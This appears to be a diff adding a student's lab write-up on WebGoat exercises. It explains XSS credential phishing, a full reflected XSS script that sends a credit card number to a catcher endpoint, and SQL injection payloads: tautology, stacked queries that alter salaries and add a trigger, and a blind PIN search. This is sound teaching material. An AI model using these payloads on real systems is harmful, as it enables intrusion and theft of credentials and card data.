@@ -1,0 +1,51 @@
+#Yi Wang, 1002421480, paulyf.wang@mail.utoronto.ca
+
+Part 1 Explanation:
+The vulerability used was the website not cleaning input, allowing us to inject html/js into the browser via search text box. The injected code creates a fake login prompt on the search result, which has a function hack() bound to the onclick event of the fake login button. Once the button is clicked the function executes, sending the form data of the username and password to any arbitrary web endpoint and thus stealing the credentials.
+
+Part 2 Explanation:
+The field which requests the 3 digit access code is vulnerable as when the pattern for the 3 digit code is not matched, it displays it on the web page without sanitation. This gives us a vector of attack by injecting javascript into the page, and utilize reflected XSS. This is done by monitoring the GET request made by the page in order to figure out the query params of the URL. We can easily obtain the compromised web page by simply injecting our code directly into the vulnerable text box and capturing the outgoing get request when Buy is clicked. The script in the URL decoded, using the parameter 'input2' is shown below 
+<script>
+	window.addEventListener('load', function () {
+	  	var num = document.getElementsByName("input1")[0].value;
+		console.log(num);
+		var buy = document.getElementsByName("buy")[0];
+		buy.onclick = function() {
+			var xhr = new XMLHttpRequest();
+			xhr.open("POST", ' http://localhost:8080/WebGoat/catcher?PROPERTY=yes&stolenCreditCard='+num, false);
+			xhr.send();
+		};
+		var noSus = document.getElementsByName("input2")[0];
+		noSus.style.display = "none";
+		var fake = document.createElement("INPUT");
+		fake.setAttribute("type", "text");
+		fake.setAttribute("value", "000");
+		noSus.parentNode.appendChild(fake);
+		console.log("Successfully injected code")
+	})
+</script>
+
+By sending this script in, and making sure our target element, the Buy button element, exists using a load Event Listener, we can overwrite the onclick function on the DOM. we make the Buy button actually send the credit card number to a web endpoint we decide, as well as hide the 'input2' field which contains text of our script with a placeholder one of '000' which makes this not look suspicious.
+
+Part 6 Explanation:
+We exploited unsanitized input for this SQL injection. By setting a' or 1=1 -- into our input field, we effectively changed the condition from select * from user_data where last_name = a into select *  from user_data where last_name = a OR 1=1, which will return the entire table since our condition 1=1 will return true every time. The -- at the end is to comment out the ending ' mark used to close off the expected string input and ensure our injection does not error out.
+
+Part 7 Explanation:
+The vulnerability is also lack of saniation on input. In this case it allows us to input anything after our initial query, including semicolons which create a new line in the SQL query. This first exploit on changing salary leverages this to initiate an Update on the database, after our initial Select query, changing our salary to 555000. The second exploit uses the same principle of the semicolon allowing us to write an arbitrary amount of SQL lines into just this one query, by injecting a trigger on the employees table, which lets us set the emails of everyone in the employees db to “​ece568-2020@utoronto.ca​” every time an insert operation happens on this database.
+
+Part 8 Explanation:
+The final confirmation for PIN used the following SQL injection code 101 and exists(select * from credit where cc_number = 1234123412341234 and pin = 4862). The logic behind this was that we can essentially piggyback off of a vulnerability on one DB to another DB. In this case, since we know that client ID 101 exists, we can use that to our advantage by ANDing that (which is essentially just 'true') with a exists() statement on the credit table. Since we have a target credit card number, we can just vary our pin value until we get the right number. It was also clear from the results of a query that it simply checked if the return result of the query had any rows, giving invalid if number of rows was 0 and valid if > 0. Knowing this, we started with:
+
+101 and exists(select * from credit where cc_number = 1234123412341234 and pin < 5000), and basically used a binary tree search methodology, in which if the result was true, we would halve the value, in this case to 
+
+101 and exists(select * from credit where cc_number = 1234123412341234 and pin < 2500) 
+
+or if not, we know it is inthe upper half, so used 
+
+101 and exists(select * from credit where cc_number = 1234123412341234 and pin < 7500)
+
+Using this method we are able to narrow it down really quickly to the correct pin and for validation, we used the query
+
+101 and exists(select * from credit where cc_number = 1234123412341234 and pin = 4862)
+
+Tis above query would only return with a row if and only if we got the correct PIN and credit card number combination.
